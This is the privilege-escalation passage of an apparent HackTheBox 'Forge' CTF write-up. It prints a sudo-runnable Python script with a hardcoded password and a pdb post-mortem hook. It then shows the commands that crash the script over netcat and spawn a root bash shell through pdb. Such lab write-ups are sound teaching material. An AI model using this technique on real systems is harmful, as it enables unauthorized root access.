</code></pre><p>And we logged in!</p><h1 id="privilege-escalation">Privilege escalation<a hidden="" class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1><p>Letâ€™s check for things to run like sudo without password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>user@forge:~$ sudo -l
</span></span><span style="display:flex"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> user on forge:
</span></span><span style="display:flex"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>User user may run the following commands on forge:
</span></span><span style="display:flex"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</span></span></code></pre></div><p>Here is the script:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="display:flex"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex"><span><span style="color:#f92672">import</span> pdb
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>port <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">1025</span>, <span style="color:#ae81ff">65535</span>)
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex"><span>    sock<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex"><span>    sock<span style="color:#f92672">.</span>bind((<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, port))
</span></span><span style="display:flex"><span>    sock<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Listening on localhost:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>    (clientsock, addr) <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>accept()
</span></span><span style="display:flex"><span>    clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter the secret passsword: &#39;</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">if</span> clientsock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;secretadminpassword&#39;</span>:
</span></span><span style="display:flex"><span>        clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Wrong password!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex"><span>        clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Welcome admin!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex"><span>            clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">What do you wanna do: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>            clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[1] View processes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>            clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[2] View free memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>            clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[3] View listening sockets</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>            clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[4] Quit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>            option <span style="color:#f92672">=</span> int(clientsock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)<span style="color:#f92672">.</span>strip())
</span></span><span style="display:flex"><span>            <span style="color:#66d9ef">if</span> option <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex"><span>                clientsock<span style="color:#f92672">.</span>send(subprocess<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#39;ps aux&#39;</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex"><span>            <span style="color:#66d9ef">elif</span> option <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex"><span>                clientsock<span style="color:#f92672">.</span>send(subprocess<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#39;df&#39;</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex"><span>            <span style="color:#66d9ef">elif</span> option <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex"><span>                clientsock<span style="color:#f92672">.</span>send(subprocess<span style="color:#f92672">.</span>getoutput(<span style="color:#e6db74">&#39;ss -lnt&#39;</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex"><span>            <span style="color:#66d9ef">elif</span> option <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex"><span>                clientsock<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Bye</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex"><span>    print(e)
</span></span><span style="display:flex"><span>    pdb<span style="color:#f92672">.</span>post_mortem(e<span style="color:#f92672">.</span>__traceback__)
</span></span><span style="display:flex"><span><span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex"><span>    quit()
</span></span></code></pre></div><p>It is opening a TCP socket locally and running as a server to perform some simple administration comands (nothing aparently dangerous). But if you think about it, we could create for example a df executable and add it to the path, so that would be executed instead of the original one.</p><p>We can run the script like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo python3 /opt/remote-manage.py
</span></span><span style="display:flex"><span>Listening on localhost:38134
</span></span></code></pre></div><p>We can see in the script that there is a hardcoded password which you can input if you open a new ssh connection with a netcat command (to connect to the tcp socket).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>user@forge:~$ nc localhost <span style="color:#ae81ff">38134</span>
</span></span><span style="display:flex"><span>Enter the secret passsword: secretadminpassword
</span></span><span style="display:flex"><span>Welcome admin!
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>What <span style="color:#66d9ef">do</span> you wanna <span style="color:#66d9ef">do</span>:
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> View processes
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> View free memory
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>3<span style="color:#f92672">]</span> View listening sockets
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> Quit
</span></span></code></pre></div><p>I was going to do the malicious df executable until I saw <code>import pdb</code>. PDB is the Python Debugger, which can also run python, so we could create an interactive shell.</p><p>The debugger is being called when there is an error in the try. We can easily enter the except if we input something that is not a number or even close the connection while being asked.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>user@forge:~$ nc localhost <span style="color:#ae81ff">38134</span>
</span></span><span style="display:flex"><span>Enter the secret passsword: secretadminpassword
</span></span><span style="display:flex"><span>Welcome admin!
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>What <span style="color:#66d9ef">do</span> you wanna <span style="color:#66d9ef">do</span>:
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> View processes
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> View free memory
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>3<span style="color:#f92672">]</span> View listening sockets
</span></span><span style="display:flex"><span><span style="color:#f92672">[</span>4<span style="color:#f92672">]</span> Quit
</span></span><span style="display:flex"><span>^C
</span></span></code></pre></div><p>This will create a pdb session in the server ssh session.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>sudo python3 /opt/remote-manage.py
</span></span><span style="display:flex"><span>Listening on localhost:38134
</span></span><span style="display:flex"><span>invalid literal <span style="color:#66d9ef">for</span> int<span style="color:#f92672">()</span> with base 10: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex"><span>&gt; /opt/remote-manage.py<span style="color:#f92672">(</span>27<span style="color:#f92672">)</span>&lt;module&gt;<span style="color:#f92672">()</span>
</span></span><span style="display:flex"><span>-&gt; option <span style="color:#f92672">=</span> int<span style="color:#f92672">(</span>clientsock.recv<span style="color:#f92672">(</span>1024<span style="color:#f92672">)</span>.strip<span style="color:#f92672">())</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">(</span>Pdb<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>As we said, pdb lets you run python code. Youâ€™d probably now at this point how to call an interactive shell with python:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="display:flex"><span>Listening on localhost:38134
</span></span><span style="display:flex"><span>invalid literal <span style="color:#66d9ef">for</span> int<span style="color:#f92672">()</span> with base 10: b<span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex"><span>&gt; /opt/remote-manage.py<span style="color:#f92672">(</span>27<span style="color:#f92672">)</span>&lt;module&gt;<span style="color:#f92672">()</span>
</span></span><span style="display:flex"><span>-&gt; option <span style="color:#f92672">=</span> int<span style="color:#f92672">(</span>clientsock.recv<span style="color:#f92672">(</span>1024<span style="color:#f92672">)</span>.strip<span style="color:#f92672">())</span>
</span></span><span style="display:flex"><span><span style="color:#f92672">(</span>Pdb<span style="color:#f92672">)</span> import pty
</span></span><span style="display:flex"><span><span style="color:#f92672">(</span>Pdb<span style="color:#f92672">)</span> pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex"><span>root@forge:/home/user#
</span></span></code></pre></div><p>And then we can read the root flag ðŸ¤ .</p></div><footer class="post-footer"><ul class="post-tags"><li><a href="https://xzebra.dev/tags/cybersecurity/">cybersecurity</a></li><li><a href="https://xzebra.dev/tags/ctf/">ctf</a></li><li><a href="https://xzebra.dev/tags/linux/">linux</a></li><li><a href="https://xzebra.dev/tags/hackthebox/">hackthebox</a></li></ul><div class="share-buttons"><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Forge on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20Writeup%3a%20Forge&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f&amp;hashtags=cybersecurity%2cctf%2clinux%2chackthebox"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Forge on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f&amp;title=HackTheBox%20Writeup%3a%20Forge&amp;summary=HackTheBox%20Writeup%3a%20Forge&amp;source=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Forge on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f&amp;title=HackTheBox%20Writeup%3a%20Forge"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Forge on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Forge on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20Writeup%3a%20Forge%20-%20https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"></path></svg></a><a target="_blank" rel="noopener noreferrer" aria-label="share HackTheBox Writeup: Forge on telegram" href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Forge&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_forge%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>